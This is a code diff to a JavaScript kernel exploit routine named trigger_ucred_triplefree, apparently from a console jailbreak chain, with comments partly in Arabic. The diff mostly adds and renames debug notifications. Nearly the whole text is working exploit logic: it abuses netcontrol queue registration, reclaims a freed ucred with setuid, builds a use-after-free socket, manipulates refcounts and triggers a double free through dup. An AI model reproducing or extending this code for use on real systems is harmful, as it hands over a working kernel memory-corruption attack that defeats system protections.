@@ -1432,56 +1432,89 @@ function trigger_ucred_triplefree() {
     //log("[TRIGGER] loop start main_count=" + main_count);
 
     // 1) dummy socket → register in netcontrol
-    sendNotification("step 1: create dummy_socket & register in netcontrol - start");
+    send_notification("step 1: start");
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    send_notification("step 1: dummy_socket = " + dummy_socket);
+
     var sock_buf = malloc(8);
     write32(sock_buf, dummy_socket);
+    send_notification("step 1: sock_buf[0..3] = " + read32(sock_buf));
+
     netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, sock_buf, 8);
+    send_notification("step 1: after netcontrol SET_QUEUE");
+
     close(dummy_socket);
-    sendNotification("step 1: done");
+    send_notification("step 1: done (dummy_socket closed)");
+
 
     // 2) allocate new ucred
-    sendNotification("step 2: setuid(1) (alloc new ucred) - start");
+    send_notification("step 2: start (setuid(1) alloc new ucred)");
     setuid(1);
-    sendNotification("step 2: done");
+    send_notification("step 2: done");
+
 
     // 3) reclaim fd → uaf_socket
-    sendNotification("step 3: reclaim fd → uaf_socket - start");
+    send_notification("step 3: start (reclaim fd → uaf_socket)");
     uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    sendNotification("step 3: done");
+    send_notification("step 3: uaf_socket = " + uaf_socket);
+    send_notification("step 3: done");
+
 
     // 4) free previous ucred
-    sendNotification("step 4: setuid(1) (free previous ucred) - start");
+    send_notification("step 4: start (setuid(1) free previous ucred)");
     setuid(1);
-    sendNotification("step 4: done");
+    send_notification("step 4: done");
+
 
     // 5) unregister → free file + ucred
-    sendNotification("step 5: unregister → free file + ucred - start");
+    send_notification("step 5: start (unregister → free file + ucred)");
     var ctrl_buf = malloc(8);
     write32(ctrl_buf, uaf_socket);
+    send_notification("step 5: ctrl_buf[0..3] = " + read32(ctrl_buf));
+
     netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, ctrl_buf, 8);
-    sendNotification("step 5: done");
+    send_notification("step 5: after netcontrol CLEAR_QUEUE");
+    send_notification("step 5: done");
+
 
     // 6) محاولة إصلاح refcount بشكل خفيف
-    sendNotification("step 6: refcount fix loop start, loops=" + TRIPLEFREE_REFCOUNT_FIX_LOOPS);
+    send_notification(
+      "step 6: start refcount fix loop, loops=" + TRIPLEFREE_REFCOUNT_FIX_LOOPS +
+      ", iov_sock_0=" + iov_sock_0 + ", iov_sock_1=" + iov_sock_1
+    );
+
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
-      sendNotification("step 6: loop i=" + i + " - before trigger_iov_recvmsg");
+      send_notification("step 6: loop i=" + i + " BEFORE trigger_iov_recvmsg");
       trigger_iov_recvmsg();
-      write(new BigInt(iov_sock_1), tmp, 1);
-      sendNotification("step 6: loop i=" + i + " - after write, before wait_iov_recvmsg");
+
+      var w = write(iov_sock_1, tmp, 1);
+      send_notification(
+        "step 6: loop i=" + i +
+        " AFTER write: fd=" + iov_sock_1 +
+        ", write_ret=" + w
+      );
+
       wait_iov_recvmsg();
-      read(new BigInt(iov_sock_0), tmp, 1);
-      sendNotification("step 6: loop i=" + i + " - after read");
+      send_notification("step 6: loop i=" + i + " AFTER wait_iov_recvmsg");
+
+      var r = read(iov_sock_0, tmp, 1);
+      // لو عندك read8(tmp) أو ما شابه تقدر تستخدمه هنا
+      send_notification(
+        "step 6: loop i=" + i +
+        " AFTER read: fd=" + iov_sock_0 +
+        ", read_ret=" + r
+      );
     }
-    sendNotification("step 6: done");
+
+    send_notification("step 6: done");
 
     // 7) double free أول مرة
-    sendNotification("step 7: first double-free via dup(uaf_socket) - start");
+    send_notification("step 7: first double-free via dup(uaf_socket) - start");
     var dup_fd = dup(uaf_socket);
     if (dup_fd > -1) {
         close(dup_fd);
     }
-    sendNotification("step 7: done");
+    send_notification("step 7: done");
 
     // 8) إيجاد التوأم
     log("[TRIGGER] step 8: find_twins()");
